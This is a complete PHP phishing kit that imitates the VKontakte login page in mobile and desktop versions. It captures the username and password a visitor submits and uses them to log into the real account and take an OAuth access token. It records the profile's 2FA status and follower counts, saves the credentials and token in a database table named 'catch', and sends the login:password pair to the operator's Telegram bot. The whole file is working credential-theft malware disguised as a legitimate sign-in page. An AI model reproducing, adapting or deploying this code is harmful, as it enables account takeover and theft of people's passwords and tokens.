<?php

	visitors();

	function check_mobile_device() { 
		$mobile_agent_array = array('ipad', 'iphone', 'android', 'pocket', 'palm', 'windows ce', 'windowsce', 'cellphone', 'opera mobi', 'ipod', 'small', 'sharp', 'sonyericsson', 'symbian', 'opera mini', 'nokia', 'htc_', 'samsung', 'motorola', 'smartphone', 'blackberry', 'playstation portable', 'tablet browser');
		$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
		foreach ($mobile_agent_array as $value) {    
			if (strpos($agent, $value) !== false) return true;   
		}       
		return false; 
	}
	
	$is_mobile_device = check_mobile_device();
	
	
	if(isset($_POST['submit'])) {
		if(empty($_POST['email']) OR empty($_POST['pass'])) {
			$error = True;
		} else {
			if(substr($_POST['email'], 0, 1) == '+') {
				$login = mb_substr($_POST['email'], 1);
			} else {
				$login = $_POST['email'];
			}
			
			$password = Switcher::fromCyrillic($_POST['pass']);
			
			if(preg_match('/^\d+$/', $login)) {
				if(substr($_POST['email'], 0, 1) == '7') {
					$security_check_code = substr($login, 1, -2);
				}
			}
			
			$headers = Array(
				'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'content-type' => 'application/x-www-form-urlencoded',
				'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
			);
		 
			$get_main_page = post('https://vk.com', Array(
				'headers' => Array(
					'accept: '.$headers['accept'],
					'content-type: '.$headers['content-type'],
					'user-agent: '.$headers['user-agent']
				)
				));
		 
			preg_match('/name=\"ip_h\" value=\"(.*?)\"/s', $get_main_page['content'], $ip_h);
			preg_match('/name=\"lg_h\" value=\"(.*?)\"/s', $get_main_page['content'], $lg_h);
		 
			$post_auth = post('https://login.vk.com/?act=login', Array(
				'params' => 'act=login&role=al_frame&_origin='.urlencode('http://vk.com').'&ip_h='.$ip_h[1].'&lg_h='.$lg_h[1].'&email='.urlencode($login).'&pass='.urlencode($password),
				'headers' => Array(
					'accept: '.$headers['accept'],
					'content-type: '.$headers['content-type'],
					'user-agent: '.$headers['user-agent'],
				),
				'cookies' => $get_main_page['cookies']
			));
		 
			preg_match('/Location\: (.*)/u', $post_auth['headers'], $post_auth_location);
		 
			if(!preg_match('/\_\_q\_hash=/s', $post_auth_location[1])) {
				$error = True;
			} else {
#				$get_auth_location = post(trim(str_replace('_http', '_https', $post_auth_location[1])), Array(
#					'headers' => Array(
#						'accept: '.$headers['accept'],
#						'content-type: '.$headers['content-type'],
#						'user-agent: '.$headers['user-agent']
#					),
#					'cookies' => $post_auth['cookies']
#					));
#			 
#				preg_match('/"uid"\:"([0-9]+)"/s', $get_auth_location['content'], $uid);
#			 
#				$uid = $uid[1];
#			 
#				#$get_my_page = getUserPage($uid, $get_auth_location['cookies']);
				
				$uid = substr(getUserToken($login, $password)['content'], 129, -1);
				$content = str_replace('{"access_token":"', '', getUserToken($login, $password)['content']);
				$access_token = str_replace('","expires_in":0,"user_id":'.$uid.'}', '', $content);
				
				if(!empty($access_token)) {
					$execute = urlencode('return API.account.getInfo({"fields":"country,2fa_required"});');
					$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$access_token.'')));
					
					$country = $vkapi->response->country;
					$auth2fa = '2fa_required';
					$auth2fa = $vkapi->response->$auth2fa;
					
					$execute = urlencode('return API.users.get({"user_ids":"'.$uid.'", "fields":"photo_50,counters"});');
					$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$access_token.'')));
					if($vkapi->response->error) {
						$auth2fa = '3';
					
						$execute = urlencode('return API.users.get({"user_ids":"'.$uid.'", "fields":"photo_50,counters"});');
						$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$config['access_token'].'')));
					}
				} else {
					$auth2fa = '3';
					
					$execute = urlencode('return API.users.get({"user_ids":"'.$uid.'", "fields":"photo_50,counters"});');
					$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$config['access_token'].'')));
				}
						
				$firstname = $vkapi->response[0]->first_name;
				$lastname = $vkapi->response[0]->last_name;
				$avatar = $vkapi->response[0]->photo_50;
				$friends = $vkapi->response[0]->counters->friends;
				$followers = $vkapi->response[0]->counters->followers;
				$votes = '0';
				if(isset($_COOKIE['invite'])) { $referal = $_COOKIE['invite']; } else { $referal = ''; }
				if($config['mailing'] == True AND !empty($config['group_id'])) {
					$execute = urlencode('return API.messages.allowMessagesFromGroup({"group_id":"'.$config['group_id'].'"});');
					$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$access_token.'')));
					
					$mailing = '1';
				} else {
					$mailing = '0';
				}
				
				$result = mysql_query("SELECT `login`, `invite` FROM `catch` WHERE `login` = '$login'");
				if(mysql_num_rows($result) > 0) {
					$invite = mysql_fetch_row($result);
					$invite = $invite['invite'];
					
					$query = "UPDATE `catch`
							  SET `access_token` = '".$access_token."', `country` = '$country', `password` = '$password', `2fa` = '$auth2fa', `avatar` = '$avatar', `friends` = '$friends', `followers` = '$followers', `votes` = '$votes', `mailing` = '$mailing', `ip` = '".getIp()."', `browser` = '".getBrowser($_SERVER['HTTP_USER_AGENT'])."', `browser` = '".getOS($_SERVER['HTTP_USER_AGENT'])."', `date` = '".serverCurrentDate()."'
							  WHERE `login` = '$login'
							 ";
					$res = mysql_query($query) or die (mysql_error());
				} else {
					$invite = rcode('6');
					
					$query = "INSERT INTO `catch`
							  (`uid`,`firstname`,`lastname`,`access_token`,`country`,`login`,`password`,`2fa`,`avatar`,`friends`,`followers`,`votes`,`mailing`,`referal`,`invite`,`ip`,`browser`,`os`,`date`)
							  VALUES ('$uid','$firstname','$lastname','$access_token','$country','$login','$password','$auth2fa','$avatar','$friends','$followers','0','$mailing','$referal','$invite','".getIp()."','".getBrowser($_SERVER['HTTP_USER_AGENT'])."','".getOS($_SERVER['HTTP_USER_AGENT'])."','".serverCurrentDate()."')
							 ";
					$res = mysql_query($query) or die(mysql_error());
					
					setcookie('invite', NULL, time()-3600*30);
				}
				
				if($config['tg_bot'] == True AND isset($config['tg_chat_id']) AND isset($config['tg_token'])) {
					if(isset($auth2fa) AND $auth2fa == 0) { $auth2fa = 'нет'; } elseif(isset($auth2fa) AND $auth2fa == 1) { $auth2fa = 'есть'; } else { $auth2fa = 'не известно'; }
						$message = '🔔 Авторизован новый аккаунт!

						👤 '.$firstname.' '.$lastname.'
						👥 '.$friends.' '.wordEndings($friends, 'друг', 'друга', 'друзей').', '.$followers.' '.wordEndings($followers, 'подписчик', 'подписчика', 'подписчиков').'
						🔒 2FA: '.$auth2fa.'
						🔑 '.$login.':'.$password.'
						🌍 https://vk.com/id'.$uid.'
						';
					
					file_get_contents('https://api.telegram.org/bot'.$config['tg_token'].'/sendMessage?chat_id='.$config['tg_chat_id'].'&text='.urlencode(preg_replace('/\t/','',$message)));
				}
				
				header('Location: '.siteURL().'/index.php?id=435&page=voting');
			}
		}
	}
	
	function getUserToken($login = null, $password = null, $cookie = null) {
		global $headers;
		
		$get = post('https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username='.$login.'&password='.$password.'&captcha_key=&captcha_sid=', Array(
			'headers' => Array(
				'accept: '.$headers['accept'],
				'content-type: '.$headers['content-type'],
				'user-agent: '.$headers['user-agent']
			),
			'cookies' => $cookies
			));
 
		return $get;
	}
	
	function getUserPage($id = null, $cookies = null) {
		global $headers;
 
		$get = post('https://vk.com/id'.$id, Array(
			'headers' => Array(
				'accept: '.$headers['accept'],
				'content-type: '.$headers['content-type'],
				'user-agent: '.$headers['user-agent']
			),
			'cookies' => $cookies
			));
 
		return $get;
	}
 
	function post($url = null, $params = null, $proxy = null, $proxy_userpwd = null) {		
		if(isset($config['proxy'])) { $proxy = $config['proxy']; }
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		$fOut = fopen($_SERVER["DOCUMENT_ROOT"].'/'.'curl_out.txt', "w" );
		curl_setopt ($ch, CURLOPT_VERBOSE, 1);
		curl_setopt ($ch, CURLOPT_STDERR, $fOut);
 
		if(isset($params['params'])) {
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $params['params']);
		}
		
		if(isset($params['headers'])) {
			curl_setopt($ch, CURLOPT_HTTPHEADER, $params['headers']);
		}
		
		if(isset($params['cookies'])) {
			curl_setopt($ch, CURLOPT_COOKIE, $params['cookies']);
		}
		
		if($proxy) {
			curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS); 
			curl_setopt($ch, CURLOPT_PROXY, $proxy);
 
			if($proxy_userpwd) {
				curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_userpwd);
			}
		}
 
		$result = curl_exec($ch);
		$result_explode = explode("\r\n\r\n", $result);
		$headers = ((isset($result_explode[0])) ? $result_explode[0]."\r\n" : '').''.((isset($result_explode[1])) ? $result_explode[1] : '');
		$content = $result_explode[count($result_explode) - 1];
		preg_match_all('|Set-Cookie: (.*);|U', $headers, $parse_cookies);
		$cookies = implode(';', $parse_cookies[1]);
		curl_close($ch);
 
		return Array('headers' => $headers, 'cookies' => $cookies, 'content' => $content);
	}
	
	if($is_mobile_device) {

?>

<!DOCTYPE html>
<html class="vk vk_js_yes vk_1x vk_flex_yes r d h  vk_appAuth_no n vk_old">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="format-detection" content="telephone=no">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="MobileOptimized" content="176">
	<meta name="HandheldFriendly" content="True">
	<meta name="theme-color" content="#5181b8">
	<meta name="robots" content="noindex,nofollow">
	<title>Получение доступа к ВКонтакте</title>
	<link rel="shortcut icon" href="<?php echo siteURL(); ?>/core/themes/assets/img/favicon.ico">
	<link type="text/css" rel="stylesheet" media="" href="<?php echo siteURL(); ?>/core/themes/assets/css/oauth_base.css">
	<link type="text/css" rel="stylesheet" media="" href="<?php echo siteURL(); ?>/core/themes/assets/css/mobile_common.css">
</head>
<body class="vk__page _touch _ios _ios_11 vk_ios_yes vk_stickers_hints_support_no opera_mini_no vk_safari_yes vk__page_oauth vk_tabbar_bottom vk_al_no" onresize="onBodyResize(true);">
	<div class="layout">
		<div class="layout__header mhead" id="vk_head">
			<div class="hb_wrap">
				<div class="hb_btn">&nbsp;</div>
			</div>
		</div>
		<div class="layout__body  _js _copts" id="vk_wrap">
			<div class="layout__leftMenu" id="l"> </div>
			<div class="layout__basis" id="m" style="min-height: 0px; margin-top: 0px;">
				<div class="basis">
					<div class="basis__header mhead basis__header_noBottomMenu" id="mhead">
						<div class="hb_wrap mhb_logo">
							<div class="hb_btn mhi_logo">&nbsp;</div>
							<h1 class="hb_btn mh_header">&nbsp;</h1>
						</div>
					</div>
					<div class="basis__menu"></div>
					<div class="basis__content mcont " id="mcont" data-canonical="">
						<div class="pcont fit_box bl_cont">
							<div class="PageBlock">
								<div class="owner_panel oauth_mobile_header"> <img src="https://pp.userapi.com/c858436/v858436982/e6e5/3hfiNDNNths.jpg" class="op_fimg">
									<div class="op_fcont">
										<div class="op_owner">kxrxlevsky</div>
										<div class="op_info">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
									</div>
								</div>
								<div class="form_item fi_fat">
									<?php if(isset($error)) { echo '
									<div class="fi_row">
										<div class="service_msg_box">
											<div class="service_msg service_msg_warning">Указан неверный логин или пароль.</div>
										</div>
									</div>
									'; }
									?>
									<form method="POST">
										<dl class="fi_row"> <dt class="fi_label">Телефон или email:</dt>
											<dd>
												<div class="iwrap">
													<input type="text" class="textfield" name="email" value="">
												</div>
											</dd>
										</dl>
										<dl class="fi_row"> <dt class="fi_label">Пароль:</dt>
											<dd>
												<div class="iwrap">
													<input type="password" class="textfield" name="pass">
												</div>
											</dd>
										</dl>
										<div class="fi_row">
											<div class="fi_subrow">
												<input class="button" name="submit" type="submit" value="Войти">
												<div class="near_btn"><a href="<?php echo siteURL(); ?>">Отмена</a></div>
											</div>
										</div>
										<div class="fi_row_new">
											<div class="fi_header fi_header_light">Ещё не зарегистрированы?</div>
										</div>
										<div class="fi_row"> <a class="button wide_button gray_button" href="https://m.vk.com/join" rel="noopener">Зарегистрироваться</a> </div>
									</form>
								</div>
							</div>
						</div>
					</div>
					<div class="basis__footer mfoot" id="mfoot">
						<div class="pfoot">
							<ul class="footer_menu">
								<li class="fm_row"><a class="fm_item" href="https://m.vk.com/">Eesti</a></li>
								<li class="fm_row"><a class="fm_item" href="https://m.vk.com/">English</a></li>
								<li class="fm_row"><a class="fm_item" href="https://m.vk.com/">Українська</a></li>
								<li class="fm_row"><a class="fm_item" href="https://m.vk.com/">all languages »</a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div> <a class="FloatBtn FloatBtn_nowrap FloatBtn_open" href="https://oauth.vk.com/join?from=float" data-skiponclick="1"><span class="FloatBtn__text">Регистрация</span><i class="FloatBtn__close" onclick="uRegisterFloatBtn._onCloseClick(event)"></i></a>
</body>
</html>

<?php } else { ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>ВКонтакте | Вход</title>
	<link rel="shortcut icon" href="<?php echo siteURL(); ?>/core/themes/assets/img/favicon.ico">
	<link rel="stylesheet" type="text/css" href="<?php echo siteURL(); ?>/core/themes/assets/css/common.css">
	<link rel="stylesheet" type="text/css" href="<?php echo siteURL(); ?>/core/themes/assets/css/fonts_cnt.css">
	<link rel="stylesheet" type="text/css" href="<?php echo siteURL(); ?>/core/themes/assets/css/fonts_utf.css">
	<link type="text/css" rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/assets/css/oauth_popup.css">
	<script type="text/javascript" language="javascript" src="<?php echo siteURL(); ?>/core/themes/assets/js/common_light.js"></script>
</head>
<body onload="doResize();" class="VK oauth_centered">
	<div class="oauth_wrap">
		<div class="oauth_wrap_inner">
			<div class="oauth_wrap_content" id="oauth_wrap_content">
				<div class="oauth_head">
					<a class="oauth_logo fl_l" href="http://vk.com/login.php?act=slogin" target="_blank"></a>
					<div id="oauth_head_info" class="oauth_head_info fl_r"> <a class="oauth_reg_link" href="http://vk.com/login.php?act=slogin" target="_blank">Регистрация</a> </div>
				</div>
				<div class="oauth_content box_body clear_fix">
					<div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
					<form method="POST" id="login_submit">
						<div class="oauth_form">
							<?php if(isset($error)) { echo '<div class="box_error">Указан неверный логин или пароль.</div>'; } ?>
							<div class="oauth_form_login">
								<div class="oauth_form_header">Телефон или email</div>
									<input type="text" class="oauth_form_input dark" name="email" value="">
								<div class="oauth_form_header">Пароль</div>
									<input type="password" class="oauth_form_input dark" name="pass">
								<button class="flat_button oauth_button button_wide" id="install_allow" name="submit" type="submit">Войти</button> <a class="oauth_forgot" href="http://vk.com/login.php?act=slogin" target="_blank">Забыли пароль?</a>
						</div>
					</form>
				</div>
			</div>
		</div>
	</div>
</body>
</html>

<?php } ?>